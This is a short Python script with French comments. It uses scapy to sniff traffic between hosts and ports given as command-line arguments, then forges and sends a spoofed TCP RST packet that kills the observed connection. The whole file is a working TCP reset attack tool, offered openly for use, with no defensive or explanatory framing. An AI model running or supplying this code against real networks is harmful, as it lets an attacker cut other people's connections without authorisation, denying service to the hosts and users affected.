#!/usr/bin/env python
#-*-coding:utf-8-*-

from scapy.all import *
import sys

#Filtre a appliquer au sniffer
filtre = "host " + sys.argv[1] + " and port " + sys.argv[2]

#Fonction pour les paquets recu
def resetHijack(p):
	if p[IP].src==sys.argv[1] and p[IP].dst==sys.argv[3]:
		print "Connection trouvé"
	print "."
	ether = Ether(dst=p[Ether].src, src=p[Ether].dst)
	ip = IP(src=p[IP].dst, dst=p[IP].src, ihl=p[IP].ihl, flags=p[IP].flags, frag=p[IP].frag, proto=p[IP].proto, id=29321)
	
	#flag RST	
	tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq, dataofs=p[TCP].dataofs, reserved=p[TCP].reserved, flags="R", window=p[TCP].window, options=p[TCP].options)
	
	reset=ether/ip/tcp
	
	sendp(reset)
	sys.exit()

sniff(count=0, prn = lambda p : resetHijack(p),filter=filtre,lfilter=lambda(f): f.haslayer(IP) and f.haslayer(TCP))
